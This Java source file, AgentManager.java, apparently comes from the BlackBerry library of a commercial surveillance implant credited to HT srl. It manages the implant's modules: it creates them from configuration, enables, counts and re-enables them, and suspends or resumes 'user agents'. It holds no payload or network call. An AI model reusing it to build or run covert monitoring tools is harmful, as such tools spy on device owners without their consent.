//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AgentManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.manager;

import java.util.Enumeration;
import java.util.Vector;

import blackberry.JobManager;
import blackberry.Singleton;
import blackberry.config.ConfModule;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.UserAgent;
import blackberry.interfaces.iSingleton;
import blackberry.module.BaseModule;
import blackberry.module.FactoryModule;

/**
 * The Class AgentManager.
 */
public final class ModuleManager extends JobManager implements iSingleton {

    private static final long GUID = 0xfa169781286585c3L;

    /** The debug instance. */
    //#ifdef DEBUG
    static Debug debug = new Debug("AgentManager", DebugLevel.VERBOSE);
    //#endif

    /** The instance. */
    static ModuleManager instance = null;

    /**
     * Gets the single instance of AgentManager.
     * 
     * @return single instance of AgentManager
     */
    public static synchronized ModuleManager getInstance() {
        if (instance == null) {
            instance = (ModuleManager) Singleton.self().get(GUID);
            if (instance == null) {
                final ModuleManager singleton = new ModuleManager();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    public BaseModule makeModule(ConfModule conf) {
        final BaseModule base = FactoryModule.create(conf.getType(), null);
        if (base != null) {
            if(base.setConf(conf)){
                add(base);
            }else{
                //#ifdef DEBUG
                debug.error("makeModule: wrong conf, don't add");
                //#endif
            }
        }
        return base;
    }

    /**
     * Re enable agent.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean reEnableAgent(final String agentId) {
        final BaseModule agent = (BaseModule) get(agentId);

        if (agent == null) {
            //#ifdef DEBUG
            debug.error("cannot renable agent " + agent);
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.trace("ReEnabling " + agent);
        //#endif
        agent.enable(true);
        return true;
    }

    /**
     * Re enable agents.
     * 
     * @return true, if successful
     */
    public synchronized boolean reEnableAgents() {
        final Enumeration e = hashtable.elements();

        while (e.hasMoreElements()) {
            final BaseModule agent = (BaseModule) e.nextElement();
            reEnableAgent(agent.getId());
        }

        return true;
    }

    /**
     * Count enabled agents.
     * 
     * @return the int
     */
    public synchronized int countEnabledAgents() {
        int enabled = 0;
        final Enumeration e = hashtable.elements();

        while (e.hasMoreElements()) {
            final BaseModule agent = (BaseModule) e.nextElement();

            if (agent.isEnabled()) {
                enabled++;
            }
        }

        return enabled;
    }

    public void resumeUserAgents() {
        //#ifdef DEBUG
        debug.trace("resumeUserAgents");
        //#endif
        Vector vector = getAllItems();
        for (int i = 0; i < vector.size(); i++) {
            BaseModule agent = (BaseModule) vector.elementAt(i);
            if (agent instanceof UserAgent) {
                if (!agent.isEnabled() && !agent.isRunning()) {
                    //#ifdef DEBUG

                    debug.trace("resumeUserAgents: " + agent);
                    //#endif
                    agent.enable(true);
                    start(agent.getId());
                }
            }
        }
    }

    public void suspendUserAgents() {
        //#ifdef DEBUG 
        debug.trace("suspendUserAgents");

        //#endif 
        Vector vector = getAllItems();
        for (int i = 0; i < vector.size(); i++) {
            BaseModule agent = (BaseModule) vector.elementAt(i);
            if (agent instanceof UserAgent) {
                if (agent.isEnabled() &&

                agent.isRunning()) {
                    //#ifdef DEBUG 
                    debug.trace("suspendUserAgents: " + agent);
                    //#endif 
                    stop(agent.getId());
                    agent.enable(false);
                }
            }
        }
    }

}
